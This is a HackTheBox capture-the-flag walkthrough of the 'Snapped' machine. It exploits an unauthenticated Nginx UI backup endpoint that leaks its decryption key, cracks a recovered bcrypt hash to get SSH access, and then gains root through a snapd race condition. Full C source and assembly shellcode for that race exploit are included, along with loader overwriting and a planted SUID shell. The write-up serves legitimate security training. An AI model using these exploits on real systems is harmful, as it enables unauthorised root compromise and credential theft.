# **Snapped - HackTheBox**

*Target Ip. Address: 10.129.242.233*

Let's start with a nmap scan.

```bash
kali@kali:nmap -sV -sC 10.129.242.233
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-24 07:12 +0000
Nmap scan report for 10.129.242.233
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)
|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://snapped.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.73 seconds
```

So, we have 2 open ports. Port 22 (ssh) and Port 80 (http). Let's update the hosts file.

```bash
kali@kali:cat /etc/hosts
10.129.242.233  snapped.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

Nothing interesting on the website, let's see if any subdomains exists.

```bash
kali@kali:ffuf -u http://snapped.htb -H "Host:FUZZ.snapped.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fw 4

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://snapped.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.snapped.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

admin                   [Status: 200, Size: 1407, Words: 164, Lines: 50, Duration: 200ms]
:: Progress: [5000/5000] :: Job [1/1] :: 212 req/sec :: Duration: [0:00:23] :: Errors: 0 ::
```

Let's add that to hosts file.

```bash
kali@kali:cat /etc/hosts                                                                                                                                           
10.129.242.233  snapped.htb admin.snapped.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

This has a login page. We don't have any credentials yet. Let's see if we have any interesting endpoints on the /api endpoint of Nginx UI.

```bash
kali@kali:gobuster dir -u http://admin.snapped.htb/api -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://admin.snapped.htb/api
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
backup               (Status: 200) [Size: 18306]
certs                (Status: 403) [Size: 34]
configs              (Status: 403) [Size: 34]
config               (Status: 403) [Size: 34]
events               (Status: 403) [Size: 34]
install              (Status: 200) [Size: 29]
licenses             (Status: 200) [Size: 52782]
node                 (Status: 403) [Size: 34]
notifications        (Status: 403) [Size: 34]
settings             (Status: 403) [Size: 34]
sites                (Status: 403) [Size: 34]
user                 (Status: 403) [Size: 34]
users                (Status: 403) [Size: 34]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

The backup endpoint with 200 status code, seems suspicious. 

```bash
kali@kali:curl -v http://admin.snapped.htb/api/backup
* Host admin.snapped.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.242.233
*   Trying 10.129.242.233:80...
* Established connection to admin.snapped.htb (10.129.242.233 port 80) from 10.10.14.36 port 53686 
* using HTTP/1.x
> GET /api/backup HTTP/1.1
> Host: admin.snapped.htb
> User-Agent: curl/8.18.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.24.0 (Ubuntu)
< Date: Tue, 24 Mar 2026 07:31:37 GMT
< Content-Type: application/zip
< Content-Length: 18306
< Connection: keep-alive
< Accept-Ranges: bytes
< Cache-Control: must-revalidate
< Content-Description: File Transfer
< Content-Disposition: attachment; filename=backup-20260324-033137.zip
< Content-Transfer-Encoding: binary
< Expires: 0
< Last-Modified: Tue, 24 Mar 2026 07:31:37 GMT
< Pragma: public
< Request-Id: b2833322-b10b-48bd-9535-15ca6da2d6ef
< X-Backup-Security: 1nr3uWC7oKlxUCbJoKFnjnQsiYh7a8E1ukBnbCET+8A=:oZI/i+OXQ6/VfJalzcXJCA==
< 
Warning: Binary output can mess up your terminal. Use "--output -" to tell curl to output it to your terminal anyway, or consider "--output <FILE>" to save 
Warning: to a file.
* client returned ERROR on write of 12926 bytes
* closing connection #0
```

We have a X-Backup-Security header on the request and also we can download a file. 

This is CVE-2026-27944, where Nginx UI prior to version 2.3.3, the /api/backup endpoint is accessible without authentication and discloses the encryption keys required to decrypt the backup in the X-Backup-Security response header.

Let's download the backup file.

```bash
kali@kali:curl -OJ -v http://admin.snapped.htb/api/backup                                                                   
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
  0      0   0      0   0      0      0      0                              0* Host admin.snapped.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.242.233
*   Trying 10.129.242.233:80...
* Established connection to admin.snapped.htb (10.129.242.233 port 80) from 10.10.14.36 port 56180 
* using HTTP/1.x
> GET /api/backup HTTP/1.1
> Host: admin.snapped.htb
> User-Agent: curl/8.18.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.24.0 (Ubuntu)
< Date: Tue, 24 Mar 2026 07:34:44 GMT
< Content-Type: application/zip
< Content-Length: 18306
< Connection: keep-alive
< Accept-Ranges: bytes
< Cache-Control: must-revalidate
< Content-Description: File Transfer
< Content-Disposition: attachment; filename=backup-20260324-033444.zip
< Content-Transfer-Encoding: binary
< Expires: 0
< Last-Modified: Tue, 24 Mar 2026 07:34:44 GMT
< Pragma: public
< Request-Id: a8d1f8dd-8dd9-4fd3-982d-df3bddd2e3b9
< X-Backup-Security: IQkEUDRNEdt88Oq5zjjKj0pJyAy3Yq04DvSAicBJc9I=:B5Nn0xaelaLuRRA9l/h4Rw==
< 
{ [8876 bytes data]
100  18306 100  18306   0      0  31890      0                              0
* Connection #0 to host admin.snapped.htb:80 left intact
```

```bash
kali@kali:unzip backup-20260324-033444.zip                                                                                                                         
Archive:  backup-20260324-033444.zip
  inflating: hash_info.txt           
  inflating: nginx-ui.zip            
  inflating: nginx.zip
```

Let's decrypt using the backp header.

```bash
kali@kali:key=$(echo 'IQkEUDRNEdt88Oq5zjjKj0pJyAy3Yq04DvSAicBJc9I=' | base64 -d | xxd -p -c 256)
kali@kali:iv=$(echo 'B5Nn0xaelaLuRRA9l/h4Rw==' | base64 -d | xxd -p)
kali@kali:openssl enc -aes-256-cbc -d -in nginx-ui.zip -out nginxui_decrypted.zip -K $key -iv $iv
```

Now, let's extract the secrets of the Nginx UI.

```bash
kali@kali:unzip nginxui_decrypted.zip                                                                                                                              
Archive:  nginxui_decrypted.zip
  inflating: app.ini                 
  inflating: database.db
```

We have a database file. Let's read the contents of it.

```bash
kali@kali:sqlite3 database.db                                                                                                                                      
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
acme_users         configs            namespaces         sites            
auth_tokens        dns_credentials    nginx_log_indices  streams          
auto_backups       dns_domains        nodes              upstream_configs 
ban_ips            external_notifies  notifications      users            
certs              llm_sessions       passkeys         
config_backups     migrations         site_configs     
sqlite> select * from users;
1|2026-03-19 08:22:54.41011219-04:00|2026-03-19 08:39:11.562741743-04:00||admin|$2a$10$8.....VltEvm|1||
...
2|2026-03-19 09:54:01.989628406-04:00|2026-03-19 09:54:01.989628406-04:00||jonathan|$2a$10$8M7.....yWq|1||
```

We have 2 hashes, but the second one seems interesting.

```bash
kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
li...rk       (?)     
1g 0:00:00:03 DONE (2026-03-24 07:34) 0.3267g/s 164.7p/s 164.7c/s 164.7C/s pasaway..claire
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We have a valid set of credentials. Let's see if we can login via ssh.

```bash
kali@kali:ssh jonathan@10.129.242.233
The authenticity of host '10.129.242.233 (10.129.242.233)' can't be established.
ED25519 key fingerprint is: SHA256:n0XlQQqHGczclhalpCeoOZDYQGr7rl3WlJytHLWPkr8
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:317: [hashed name]
    ~/.ssh/known_hosts:320: [hashed name]
    ~/.ssh/known_hosts:321: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.242.233' (ED25519) to the list of known hosts.
jonathan@10.129.242.233's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-19-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Last login: Fri Mar 20 12:27:50 2026 from 10.10.14.5
jonathan@snapped:~$
```

That was successful. We find our first flag.

```bash
jonathan@snapped:~$ cat user.txt
a8.....2b
```

We have no sudo, SUID. Exploring further we find something interesting.

```bash
jonathan@snapped:~$ snap version
snap    2.63.1+24.04
snapd   2.63.1+24.04
series  16
ubuntu  24.04
kernel  6.17.0-19-generic
```

Checking the version of snap, we find a vulnerable version. 

CVE-2026-3888, Local privilege escalation in snapd on Linux allows local attackers to get root privilege by re-creating snap's private /tmp directory when systemd-tmpfiles is configured to automatically clean up this directory.

This is a multi-stage race condition exploit.

```bash
jonathan@snapped:~$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/local/share/doc /usr/local/share/doc none bind,ro 0 0): cannot open directory "/usr/local/share": permission denied
.
.
.
update.go:85: cannot change mount namespace according to change mount (/var/lib/snapd/hostfs/usr/share/xubuntu-docs /usr/share/xubuntu-docs none bind,ro 0 0): cannot write to "/var/lib/snapd/hostfs/usr/share/xubuntu-docs" because it would affect the host in "/var/lib/snapd"
bash: /home/jonathan/.bashrc: Permission denied

jonathan@snapped:/home/jonathan$ cd /tmp

jonathan@snapped:/tmp$ echo $$
3950
```

Remember this PID, we need it.

In the machine, we need to compile 2 binaries, firefox_2404.c and librootshell.c.

```firefox_2404.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/syscall.h>

#define SNAP_CONFINE "/usr/lib/snapd/snap-confine"
#define EXCHANGE_SRC ".snap/usr/lib/x86_64-linux-gnu.exchange"
#define EXCHANGE_DST ".snap/usr/lib/x86_64-linux-gnu"
#define REAL_LIBDIR "/snap/core22/current/usr/lib/x86_64-linux-gnu"
#define TRIGGER "dir:\"/tmp/.snap/usr/lib/x86_64-linux-gnu\""

static int copy_file(const char * src, const char * dst) {
  int fds = open(src, O_RDONLY);
  if (fds < 0) return -1;
  int fdd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (fdd < 0) { close(fds); return -1; }
  char buf[65536];
  ssize_t n;
  while ((n = read(fds, buf, sizeof(buf))) > 0)
    write(fdd, buf, n);
  close(fds);
  close(fdd);
  return 0;
}

static int setup_snap_and_exchange(const char * payload_so) {
  mkdir(".snap", 0755);
  mkdir(".snap/usr", 0755);
  mkdir(".snap/usr/lib", 0755);
  mkdir(".snap/usr/local", 0755);
  mkdir(".snap/snap", 0755);
  mkdir(".snap/snap/firefox", 0755);
  DIR * d = opendir("/snap/firefox");
  if (d) {
    struct dirent * ent;
    while ((ent = readdir(d)) != NULL) {
      if (ent -> d_name[0] != '.' && strcmp(ent -> d_name, "current") != 0) {
        char p[512];
        snprintf(p, sizeof(p), ".snap/snap/firefox/%s", ent -> d_name);
        mkdir(p, 0755);
        snprintf(p, sizeof(p), ".snap/snap/firefox/%s/data-dir", ent ->d_name);
        mkdir(p, 0755);
      }
    }
    closedir(d);
  }

  mkdir(EXCHANGE_SRC, 0755);

  d = opendir(REAL_LIBDIR);
  if (!d) {
    perror("opendir real libdir");
    return -1;
  }

  int count = 0;
  struct dirent * ent;
  while ((ent = readdir(d)) != NULL) {
    if (ent -> d_name[0] == '.' &&
      (ent -> d_name[1] == '\0' ||
        (ent -> d_name[1] == '.' && ent -> d_name[2] == '\0')))
      continue;

    char src[4096], dst[4096];
    snprintf(src, sizeof(src), "%s/%s", REAL_LIBDIR, ent -> d_name);
    snprintf(dst, sizeof(dst), "%s/%s", EXCHANGE_SRC, ent -> d_name);

    struct stat st;
    if (lstat(src, & st) < 0) continue;

    if (S_ISDIR(st.st_mode)) {
      mkdir(dst, 0755);
    } else if (S_ISLNK(st.st_mode)) {
      char link[4096];
      ssize_t len = readlink(src, link, sizeof(link) - 1);
      if (len > 0) {
        link[len] = '\0';
        symlink(link, dst);
      }
    } else {
      copy_file(src, dst);
    }
    count++;
  }
  closedir(d);

  printf("[*] Exchange dir ready: %d entries in %s\n", count, EXCHANGE_SRC);
  return 0;
}

static int create_stderr_socket(int * read_fd, int * write_fd) {
  int sv[2];
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
    perror("socketpair");
    return -1;
  }
  int bufsize = 1;
  setsockopt(sv[0], SOL_SOCKET, SO_RCVBUF, & bufsize, sizeof(bufsize));
  setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, & bufsize, sizeof(bufsize));
  setsockopt(sv[1], SOL_SOCKET, SO_RCVBUF, & bufsize, sizeof(bufsize));
  setsockopt(sv[1], SOL_SOCKET, SO_SNDBUF, & bufsize, sizeof(bufsize));
  * read_fd = sv[0];
  * write_fd = sv[1];
  return 0;
}

static int run_and_race(void) {
  int read_fd, write_fd;
  if (create_stderr_socket( & read_fd, & write_fd) < 0) return -1;

  pid_t pid = fork();
  if (pid < 0) {
    perror("fork");
    return -1;
  }

  if (pid == 0) {
    close(read_fd);
    dup2(write_fd, STDERR_FILENO);
    close(write_fd);
    clearenv();
    setenv("SNAPD_DEBUG", "1", 1);
    setenv("SNAP_INSTANCE_NAME", "firefox", 1);
    execl(SNAP_CONFINE, "snap-confine",
      "--base", "core22",
      "snap.firefox.hook.configure",
      "/bin/sh", "-c",
      "echo $$ > /tmp/race_pid.txt; "
      "stat -c '%U:%G %a' /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2"
      "> /tmp/race_perms.txt 2>&1; "
      "sleep 99994",
      NULL);
    _exit(1);
  }

close(write_fd);

char ringbuf[4096];
int ringpos = 0;
memset(ringbuf, 0, sizeof(ringbuf));
int tlen = strlen(TRIGGER);
char byte;
ssize_t n;
int swapped = 0;

printf("[*] Reading snap-confine output (PID %d)...\n", pid);
while ((n = read(read_fd, & byte, 1)) > 0) {
  write(STDOUT_FILENO, & byte, 1);

  ringbuf[ringpos % sizeof(ringbuf)] = byte;
  ringpos++;

  if (!swapped && ringpos >= tlen) {
    char check[512];

    for (int i = 0; i < tlen && i < (int) sizeof(check) - 1; i++)
      check[i] = ringbuf[(ringpos - tlen + i) % sizeof(ringbuf)];
    check[tlen] = '\0';

    if (strstr(check, TRIGGER)) {
      printf("\n[!] TRIGGER DETECTED! Swapping .exchange...\n");
      #ifndef RENAME_EXCHANGE
      #define RENAME_EXCHANGE(1 << 1)
      #endif
      if (syscall(SYS_renameat2, AT_FDCWD, EXCHANGE_DST,
                  AT_FDCWD, EXCHANGE_SRC, RENAME_EXCHANGE) == 0) {
        /* atomic swap succeeded */
      } else {
          rename(EXCHANGE_DST, ".snap/usr/lib/x86_64-linux-gnu.orig");
          rename(EXCHANGE_SRC, EXCHANGE_DST);
        }

      swapped = 1;
      printf("[+] SWAP DONE! Race won.\n");
      printf("[*] Do NOT close this terminal.\n");
      }
    }
  }

close(read_fd);
int status;
waitpid(pid, & status, 0);

if (swapped)
  printf("[+] Race won! Our libraries are in the namespace.\n");
else
  printf("[-] Trigger not detected. Race lost.\n");
return swapped ? 0 : -1;
}

int main(int argc, char * argv[]) {
  if (argc < 2) {
    fprintf(stderr, "Usage: %s <payload.so>\n", argv[0]);
    return 1;
  }
  printf("[*] CVE-2026-3888 — firefox 24.04 helper\n");
  printf("[*] CWD: ");
  fflush(stdout);
  system("pwd");
  printf("[*] Setting up .snap and .exchange directory...\n");
  if (setup_snap_and_exchange(argv[1]) < 0) return 1;
  printf("[*] Starting race against snap-confine...\n");
  if (run_and_race() < 0) return 1;
  printf("[+] Done. Re-enter sandbox to exploit.\n");
  return 0;
}
```

```librootshell.c
void _start(void) {
  /* setreuid(0, 0) */
  __asm__ volatile(
    "xor %%rdi, %%rdi\n"
    "xor %%rsi, %%rsi\n"
    "mov $0x71, %%rax\n"
    "syscall\n"::: "rax", "rdi", "rsi"
  );
  /* setregid(0, 0) */
  __asm__ volatile(
    "xor %%rdi, %%rdi\n"
    "xor %%rsi, %%rsi\n"
    "mov $0x72, %%rax\n"
    "syscall\n"::: "rax", "rdi", "rsi"
  );
  /* execve("/tmp/sh", {"/tmp/sh", NULL}, NULL) */
  __asm__ volatile(
    "mov $0x68732f706d742f, %%rax\n"
    "push %%rax\n"
    "mov %%rsp, %%rdi\n"
    "push $0\n"
    "push %%rdi\n"
    "mov %%rsp, %%rsi\n"
    "xor %%rdx, %%rdx\n"
    "mov $0x3b, %%rax\n"
    "syscall\n"::: "rax", "rdi", "rsi", "rdx"
  );
}
```

Now, compile it and send the compiled binaries to over the target machine.

```bash
kali@kali:gcc -O2 -static -o firefox_2404 firefox_2404.c                                                                                                           

kali@kali:gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell.c
```

In the machine, check the stat on /tmp directory.

```bash
jonathan@snapped:/tmp$ stat ./.snap 
  File: ./.snap
  Size: 4096            Blocks: 8          IO Block: 4096   directory
Device: fc00h/64512d    Inode: 261850      Links: 4
Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2026-03-24 01:59:43.755078389 -0400
Modify: 2026-03-24 01:59:43.771078390 -0400
Change: 2026-03-24 01:59:43.771078390 -0400
 Birth: 2026-03-24 01:59:43.755078389 -0400
```

Run a loop to run until the /tmp/.snap exists.

```bash
jonathan@snapped:/tmp$ while test -d ./.snap; do touch ./; sleep 60; done
```

Now, let this loop running, start a new terminal.

```bash
jonathan@snapped:~$ cd /proc/3950/cwd
```

Go in the pid we had before in terminal 1.

After the loop stops, run the exploit.

```bash
jonathan@snapped:/proc/3950/cwd$ ~/firefox_2404 ~/librootshell.so
[*] CVE-2026-3888 — firefox 24.04 helper
[*] CWD: /proc/3950/cwd
[*] Setting up .snap and .exchange directory...
[*] Exchange dir ready: 285 entries in .snap/usr/lib/x86_64-linux-gnu.exchange
[*] Starting race against snap-confine...
[*] Reading snap-confine output (PID 4252)...
DEBUG: -- snap startup {"stage":"snap-confine enter", "time":"1774332292.607901"}
DEBUG: umask reset, old umask was   02
DEBUG: security tag: snap.firefox.hook.configure
DEBUG: executable:   /bin/sh
DEBUG: confinement:  non-classic
DEBUG: base snap:    core22
DEBUG: ruid: 1000, euid: 0, suid: 0
DEBUG: rgid: 1000, egid: 1000, sgid: 1000
DEBUG: apparmor label on snap-confine is: /usr/lib/snapd/snap-confine
DEBUG: apparmor mode is: enforce
DEBUG: -- snap startup {"stage":"snap-confine mount namespace start", "time":"1774332292.612000"}
DEBUG: creating lock directory /run/snapd/lock (if missing)
DEBUG: set_effective_identity uid:0 (change: no), gid:0 (change: yes)
DEBUG: opening lock directory /run/snapd/lock
DEBUG: set_effective_identity uid:0 (change: no), gid:1000 (change: yes)
DEBUG: opening lock file: /run/snapd/lock/.lock
DEBUG: set_effective_identity uid:0 (change: no), gid:0 (change: yes)
DEBUG: set_effective_identity uid:0 (change: no), gid:1000 (change: yes)
DEBUG: sanity timeout initialized and set for 30 seconds
DEBUG: acquiring exclusive lock (scope (global), uid 0)
DEBUG: sanity timeout reset and disabled
DEBUG: ensuring that snap mount directory is shared
DEBUG: unsharing snap namespace directory
DEBUG: set_effective_identity uid:0 (change: no), gid:0 (change: yes)
DEBUG: set_effective_identity uid:0 (change: no), gid:1000 (change: yes)
DEBUG: releasing lock 5
DEBUG: opened snap-update-ns executable as file descriptor 5
DEBUG: opened snap-discard-ns executable as file descriptor 6
DEBUG: creating lock directory /run/snapd/lock (if missing)
DEBUG: set_effective_identity uid:0 (change: no), gid:0 (change: yes)
DEBUG: opening lock directory /run/snapd/lock
.
.
.
.
```

Let it complete, or sometimes it gets stuck, then start a new terminal.

```bash
jonathan@snapped:~$ SPID=$(pgrep -f "sleep 99994" | head -1)
jonathan@snapped:~$ stat -c '%U' /proc/$SPID/root/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
jonathan
```

keep on running this, until you see jonathan instead of root.

After successful, check the race_pid.

```bash
jonathan@snapped:/proc/3950/cwd$ cat race_perms.txt
jonathan:jonathan 755
jonathan@snapped:/proc/3950/cwd$ cat race_pid.txt
4252
```

```bash
jonathan@snapped:/proc/3950/cwd$ cd /proc/4252/root
```

Then, copy busybox and replace the legitimate binary with our exploit binary.

```bash
jonathan@snapped:/proc/4252/root$ cp /usr/bin/busybox ./tmp/sh
jonathan@snapped:/proc/4252/root$ cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```

```bash
jonathan@snapped:/proc/4252/root$ env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine


BusyBox v1.36.1 (Ubuntu 1:1.36.1-6ubuntu3.1) built-in shell (ash)
Enter 'help' for a list of built-in commands.

/ # id
uid=0(root) gid=1000(jonathan) groups=1000(jonathan)
```

We are root, but we have a limited reach. 

```bash
/ # cp /bin/bash /var/snap/firefox/common/bash
/ # chmod 04755 /var/snap/firefox/common/bash
/ # ls -la /var/snap/firefox/common/bash
-rwsr-xr-x    1 root     jonathan   1396520 Mar 24 02:09 /var/snap/firefox/common/bash
```

Add a SUID /bin/bash on /var/snap/firefox/common/ as we are allowed to do this on this directory only.

Exit from this environment, use that SUID binary we set to become root.

```bash
jonathan@snapped:/var/snap/firefox/common$ ./bash -p
bash-5.1# id
uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
```

We are root. Let's read the final flag and end this challenge.

```bash
bash-5.1# cat root.txt
6e.....02
```
